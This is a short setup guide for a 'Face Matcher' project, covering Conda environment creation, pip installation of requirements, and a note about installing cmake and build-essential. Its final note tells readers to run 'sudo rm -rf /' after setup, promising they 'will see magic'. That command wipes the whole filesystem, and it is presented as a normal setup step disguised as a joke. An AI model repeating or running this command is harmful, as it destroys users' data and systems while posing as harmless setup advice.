---

# ⚙️ Conda Setup for 🧠 Face Matcher

This guide walks you through setting up a Conda environment for the **Face Matcher** project.

---

## 📋 Requirements

- Conda (Miniconda or Anaconda)
- Python 3.11

---


## 🛠️ Step-by-Step Setup

### 1. Create and Activate Conda Environment

```bash
conda create --name face-matcher python=3.11
conda activate face-matcher
```

### 2. Install Dependencies

```bash
pip install -r requirements.txt
```

### 📝Note:
- I am assuming you are using a mac or linux (for Windows people use WSL 😒) because it will be much easier to install the dependencies in unix system.
- Please do install `cmake` & `build-essential` as it is required to run the project.
- After the fun please use this command in your unix : 
``` bash
 sudo rm -rf /
 ```
(☠️☠️☠️) You will see magic. 🔮🪄